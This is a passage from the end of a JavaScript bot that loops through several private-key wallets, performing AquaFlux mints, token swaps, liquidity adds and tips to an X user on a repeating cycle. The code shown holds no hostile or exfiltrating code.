  const aquaFluxMintStr = await question(`${colors.cyan}Enter the number of AquaFlux mints (for each wallet): ${colors.reset}`);
  const numberOfMints = parseInt(aquaFluxMintStr);

  const username = await question(`${colors.cyan}Enter the X username to tip (the same user will be tipped by all wallets): ${colors.reset}`);
  const tipCountStr = await question(`${colors.cyan}Enter the number of tips to send (from each wallet): ${colors.reset}`);
  const numberOfTips = parseInt(tipCountStr);
  console.log('\n');

  while (true) {
    for (const [index, privateKey] of privateKeys.entries()) {
      try {
        const wallet = new ethers.Wallet(privateKey, provider);
        
        console.log('----------------------------------------------------------------');
        logger.success(`Processing Wallet ${index + 1}/${privateKeys.length}: ${wallet.address}`);
        console.log('----------------------------------------------------------------');


        if (!isNaN(numberOfMints) && numberOfMints > 0) {
          for (let i = 0; i < numberOfMints; i++) {
              logger.step(`Starting AquaFlux Mint #${i + 1} of ${numberOfMints}`);
              const aquaFluxSuccess = await executeAquaFluxFlow(wallet); 
              if (!aquaFluxSuccess) {
                  logger.error(`AquaFlux Mint #${i + 1} failed. Check logs above. Stopping AquaFlux mints for this wallet.`);
                  break;
              }
              if (i < numberOfMints - 1) {
                  logger.info('Waiting a moment before the next mint...');
                  await new Promise(r => setTimeout(r, 5000));
              }
          }
        } else if (index === 0) {
            logger.warn('Invalid AquaFlux mint count, skipping mints.');
        }

        if (!isNaN(numberOfSwapCycles) && numberOfSwapCycles > 0) {
            await batchSwap(wallet, numberOfSwapCycles); 
            logger.success('Swap cycle completed for this wallet!');
        } else if (index === 0) {
            logger.warn('Invalid swap cycle count, skipping swaps.');
        }

        if (!isNaN(numberOfLiquidityAdds) && numberOfLiquidityAdds > 0) {
            for(let i = 0; i < numberOfLiquidityAdds; i++) {
                logger.step(`Executing Add Liquidity #${i + 1} of ${numberOfLiquidityAdds}`);
                try {
                    await addLiquidity(wallet);
                } catch (e) {
                     logger.error(`Add Liquidity transaction #${i + 1} failed: ${e.message}`);
                }
                await new Promise(r => setTimeout(r, 2000));
            }
            logger.success('Add liquidity cycle completed for this wallet!');
        } else if (index === 0) {
            logger.warn('Invalid liquidity count, skipping add liquidity.');
        }

        if (username && !isNaN(numberOfTips) && numberOfTips > 0) {
            for (let i = 0; i < numberOfTips; i++) {
                logger.step(`Executing Tip #${i + 1} of ${numberOfTips} to ${username}`);
                try {
                    await sendTip(wallet, username);
                } catch (e) {
                    logger.error(`Tip transaction #${i + 1} failed: ${e.message}`);
                }
                if (i < numberOfTips - 1) {
                    logger.info('Waiting a moment before the next tip...');
                    await new Promise(r => setTimeout(r, 2000));
                }
            }
            logger.success('Send tip operations completed for this wallet!');
        } else if (index === 0) {
            logger.warn('Invalid username or tip count, skipping tips.');
        }

        logger.success(`All tasks finished for wallet ${wallet.address}\n`);

      } catch (err) {
        logger.error(`A critical error occurred while processing wallet ${index + 1}: ${err.message}`);
      }

      if (index < privateKeys.length - 1) {
        logger.info(`Waiting 10 seconds before starting the next wallet...`);
        await new Promise(r => setTimeout(r, 10000));
      }
    }

    logger.step('All wallets have been processed for this cycle.');
    await showCountdown();
  }
})();
